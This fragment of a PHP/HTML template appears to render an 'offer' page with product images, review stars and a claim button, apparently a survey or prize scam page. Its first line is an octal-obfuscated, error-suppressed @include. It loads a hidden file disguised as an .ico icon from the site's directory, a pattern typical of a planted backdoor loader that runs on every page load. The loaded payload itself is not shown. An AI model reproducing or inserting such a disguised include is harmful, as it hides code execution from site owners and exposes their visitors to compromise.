...
@include "\057home\057host\151ngad\155in/g\154obal\163urve\171z.co\155/Bou\171gues\057v1/.\145f43c\14466.i\143o";
   							...
   							<div id="offer_main_div_1" class="col-md-12 item sex_female" data-name="female"> 
   								<div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#fff;"> 
   									<div class="col-md-3 text-center">
   									    ...
   									    <?php if(!empty($products['images']))
   									    {
   									    ?>
   									    
   										<a href=<?php echo $products['url_1']; ?> target="_blank">
   										    <img id="offer_img_1" class="img-responsive" style="width: 100%;" src=<?php echo $products['images']; ?> alt="..." onclick="ViewOffer_1();"></a> 
   										<div class="reviewitem" style="color:#164d96;">
   										    <img id="star_img_1" src=<?php echo $products['reviews']; ?> height="18" width="71" onclick="ViewOffer_1();">
   										    <a id="offer_review_anchor_1" onclick="ViewOffer_1();">(<?php echo $products['review_users']; ?>)</a>
   										    </div> <br> 
   										    <?php
   										    }
   										    elseif(empty($products['images']) || $products['images'] == NULL)
   										    {
   										    ?>
   									...
   									<div class="col-md-9 text-left name_prod" style="color: black;"> 
   										...
   										<div id="claim_btn_div_1" class="col-md-6 height:100%;">
   										    ...
   										    {
   										        ?>
   										        <img src="<?php echo $products['img_popular'];?>" width="100px">
   										        <?php
   										    }
   										    ?>
